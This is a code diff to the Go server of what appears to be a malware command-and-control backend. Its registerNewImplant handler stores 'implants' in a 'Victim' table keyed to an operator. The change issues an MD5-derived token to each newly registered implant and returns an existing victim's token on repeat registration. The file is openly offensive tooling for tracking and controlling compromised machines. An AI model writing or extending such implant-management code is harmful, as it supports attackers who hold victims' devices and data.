@@ -1,9 +1,13 @@
 package main
 
 import (
+	"crypto/md5"
+	"crypto/rand"
 	"database/sql"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"log"
 	"net/http"
@@ -95,6 +99,17 @@ func registerNewImplant(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// Generate a random byte array
+	randomBytes := make([]byte, 16) // 16 bytes for MD5
+	if _, err := io.ReadFull(rand.Reader, randomBytes); err != nil {
+		panic(err)
+	}
+
+	// Compute the MD5 hash of the random bytes
+	hash := md5.New()
+	hash.Write(randomBytes)
+	md5String := hex.EncodeToString(hash.Sum(nil))
+
 	// Check if the user already exists in the database
 	var existingUserID int
 	err = db.QueryRow("SELECT id FROM Victim WHERE username = ?", device.Username).Scan(&existingUserID)
@@ -106,16 +121,32 @@ func registerNewImplant(w http.ResponseWriter, r *http.Request) {
 		}
 		// No existing user found; continue with registration
 	} else {
-		// Existing user found, return an appropriate response
-		log.Printf("User already exists: %s\n", device.Username)
-		http.Error(w, "User already exists", http.StatusConflict) // or another appropriate status
+		stmt, err := db.Prepare("SELECT token FROM Victim WHERE username = ?")
+		if err != nil {
+			log.Printf("Prepare error for select: %v\n", err)
+			http.Error(w, "Failed to prepare select statement for retrieving token", http.StatusInternalServerError)
+			return
+		}
+
+		// Execute the SELECT statement
+		var token string
+		err = stmt.QueryRow(device.Username).Scan(&token)
+		if err != nil {
+			log.Printf("Error executing select statement or scanning result: %v\n", err)
+			http.Error(w, "Failed to retrieve token for victim", http.StatusInternalServerError)
+			return
+		}
+
+		// Send the retrieved token in the response
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte("token: " + token))
 		return
 	}
 
 	fmt.Printf("Registering a new implant %s\n\n", device.DeviceName)
 
-	// After the data is ready, we set a list of prepared statements in order to insert the data from the JSON request into the database
-	stmt, err := db.Prepare("INSERT INTO Victim (username, operator_id) VALUES (?, ?)")
+	// Prepare SQL statement for inserting into Victim table
+	stmt, err := db.Prepare("INSERT INTO Victim (username, operator_id, token) VALUES (?, ?, ?)")
 	if err != nil {
 		log.Println(err.Error())
 		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
@@ -123,7 +154,7 @@ func registerNewImplant(w http.ResponseWriter, r *http.Request) {
 	}
 	defer stmt.Close()
 
-	res, err := stmt.Exec(device.Username, device.OperatorID)
+	res, err := stmt.Exec(device.Username, device.OperatorID, md5String)
 	if err != nil {
 		log.Println(err.Error())
 		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
@@ -213,8 +244,11 @@ func registerNewImplant(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// Additional logging to confirm the token was inserted
+	log.Printf("Successfully inserted token: %s\n", md5String)
+
 	// After all items are registered, we response with a success message
 	w.WriteHeader(http.StatusOK)
-	w.Write([]byte("New implant registered successfully"))
+	w.Write([]byte("token: " + md5String))
 	alert("New implant registered successfully")
 }
